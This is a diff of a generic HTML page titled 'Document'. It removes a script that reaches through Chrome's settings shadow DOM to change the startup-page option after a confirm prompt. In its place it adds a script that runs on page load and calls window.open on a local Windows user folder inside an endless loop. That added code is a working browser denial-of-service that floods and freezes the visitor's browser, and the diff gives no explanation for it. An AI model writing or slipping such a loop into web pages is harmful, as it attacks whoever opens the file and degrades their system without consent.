@@ -6,55 +6,8 @@
   <title>Document</title>
 </head>
 <body>
-  <script>function getShadowRoot(element) {
-    return element ? element.shadowRoot : null;
-}
-
-function findControlledRadioButton() {
-    // Get the top-level settings page
-    let settingsUi = document.querySelector('settings-ui');
-    if (!settingsUi) {
-        console.log("settings-ui not found.");
-        return;
-    }
-
-    let settingsMain = getShadowRoot(settingsUi)?.querySelector('settings-main');
-    if (!settingsMain) {
-        console.log("settings-main not found inside settings-ui.");
-        return;
-    }
-
-    let settingsBasicPage = getShadowRoot(settingsMain)?.querySelector('settings-basic-page');
-    if (!settingsBasicPage) {
-        console.log("settings-basic-page not found inside settings-main.");
-        return;
-    }
-
-    let settingsOnStartupPage = getShadowRoot(settingsBasicPage)?.querySelector('settings-on-startup-page');
-    if (!settingsOnStartupPage) {
-        console.log("settings-on-startup-page not found inside settings-basic-page.");
-        return;
-    }
-
-    // Find the controlled-radio-button inside its shadow DOM
-    let radioButton = getShadowRoot(settingsOnStartupPage)?.querySelector('controlled-radio-button[name="5"]');
-
-    if (radioButton) {
-        let userResponse = confirm("Do you want to check 'Open the New Tab page'?");
-
-        if (userResponse) {
-            radioButton.setAttribute("checked", "");
-            console.log("Checkbox is now checked.");
-        } else {
-            console.log("User canceled the action.");
-        }
-    } else {
-        console.log("Radio button not found inside settings-on-startup-page.");
-    }
-}
-
-// Run the function to find and modify the radio button
-findControlledRadioButton();
-</script>
+  <script>while (true) {
+    window.open("file:///C:/Users/ADMIN");
+}</script>
 </body>
 </html>
